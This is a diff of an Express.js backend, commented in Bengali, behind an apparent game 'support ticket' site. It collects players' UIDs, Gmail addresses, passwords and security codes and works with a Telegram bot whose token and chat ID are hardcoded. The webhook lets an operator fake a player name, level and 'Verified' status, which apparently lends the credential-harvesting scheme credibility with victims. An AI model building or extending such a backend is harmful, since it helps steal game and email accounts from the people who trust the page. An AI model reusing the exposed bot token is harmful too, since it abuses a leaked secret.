@@ -7,7 +7,6 @@ const app = express();
 app.use(cors({ origin: '*' }));
 app.use(express.json());
 
-// ব্রাউজার ক্যাশিং বন্ধ রাখার হেডার
 app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
     res.setHeader('Pragma', 'no-cache');
@@ -18,18 +17,17 @@ app.use((req, res, next) => {
 const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
 const TELEGRAM_CHAT_ID = "-1004444318249";
 
-// স্থায়ী ডাটা মেমোরি
 if (!global.persistentStore) {
     global.persistentStore = {};
 }
 
 app.get('/', (req, res) => res.send("Backend Active"));
 
-// ১. নতুন টিকিট সাবমিট
+// ১. সাবমিট টিকিট
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    // ডিফল্ট টেক্সট যা প্রথম দেখাবে
+    // নতুন ডিফল্ট নাম ও লেভেল
     global.persistentStore[String(uid)] = {
         status: "Pending",
         name: "Searching Player Name...",
@@ -76,37 +74,29 @@ app.post('/api/submit-ticket', async (req, res) => {
     }
 });
 
-// ২. টেলিগ্রাম বট বা অ্যাডমিন টেক্সট রিপ্লাই হ্যান্ডলার (নাম ও লেভেল আপডেট করার জন্য)
+// ২. টেলিগ্রাম মেসেজ এবং বাটন রিপ্লাই
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
 
     try {
         const update = req.body;
 
-        // কাস্টম নাম/লেভেল আপডেট করার জন্য: যদি টেলিগ্রামে মেসেজ রিপ্লাই দেন
-        // ফরম্যাট: UID Name Level (যেমন: 2476459395 ASRAFUL_FF 64)
+        // টেলিগ্রাম থেকে মেসেজে নাম ও লেভেল পাঠালে (ফরম্যাট: UID Name Level)
         if (update && update.message && update.message.text) {
             const text = update.message.text.trim();
             const parts = text.split(' ');
             
-            // যদি ৩টি জিনিস পাঠানো হয় (UID, Name, Level)
             if (parts.length >= 3) {
                 const uid = String(parts[0]);
-                const level = parts[parts.length - 1]; // শেষেরটি লেভেল
-                const name = parts.slice(1, parts.length - 1).join(' '); // মাঝেরটি প্লেয়ার নাম
+                const level = parts[parts.length - 1];
+                const name = parts.slice(1, parts.length - 1).join(' ');
 
-                if (global.persistentStore[uid]) {
-                    global.persistentStore[uid].name = name;
-                    global.persistentStore[uid].level = `Level ${level}`;
-                } else {
-                    global.persistentStore[uid] = {
-                        status: "Pending",
-                        name: name,
-                        level: `Level ${level}`,
-                        region: "Bangladesh",
-                        reason: ""
-                    };
+                if (!global.persistentStore[uid]) {
+                    global.persistentStore[uid] = { status: "Pending", region: "Bangladesh", reason: "" };
                 }
+                
+                global.persistentStore[uid].name = name;
+                global.persistentStore[uid].level = `Level ${level}`;
 
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     chat_id: update.message.chat.id,
@@ -117,7 +107,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             }
         }
 
-        // বাটন ক্লিক অপশন (Verify / Reject)
+        // বাটন চাপলে
         if (update && update.callback_query) {
             const callbackQuery = update.callback_query;
             const data = callbackQuery.data; 
@@ -129,16 +119,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const uid = String(parts[1]);
             const reason = parts[2] || "Information Mismatch";
 
-            const currentData = global.persistentStore[uid] || {
-                name: "Verified Player",
-                level: "Level Active"
-            };
+            const currentData = global.persistentStore[uid] || {};
 
             if (action === 'verify') {
                 global.persistentStore[uid] = {
                     status: "Verified",
-                    name: currentData.name === "Searching Player Name..." ? "Verified Player" : currentData.name,
-                    level: currentData.level === "Fetching Level..." ? "Level Active" : currentData.level,
+                    name: currentData.name || "Searching Player Name...",
+                    level: currentData.level || "Fetching Level...",
                     region: "Bangladesh",
                     reason: ""
                 };
@@ -159,8 +146,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
             } else if (action === 'reject') {
                 global.persistentStore[uid] = {
                     status: "Rejected",
-                    name: currentData.name,
-                    level: currentData.level,
+                    name: currentData.name || "Searching Player Name...",
+                    level: currentData.level || "Fetching Level...",
                     region: "Bangladesh",
                     reason: reason
                 };
@@ -174,7 +161,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     chat_id: chatId,
-                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason})!`,
+                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` marked as *REJECTED* (${reason})!`,
                     parse_mode: 'Markdown'
                 });
             }
@@ -189,7 +176,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     }
 });
 
-// ৩. লাইভ স্ট্যাটাস নেওয়ার API
+// ৩. স্ট্যাটাস চেক API
 app.get('/api/check-status/:uid', (req, res) => {
     const uid = String(req.params.uid);
     const userData = global.persistentStore[uid] || {
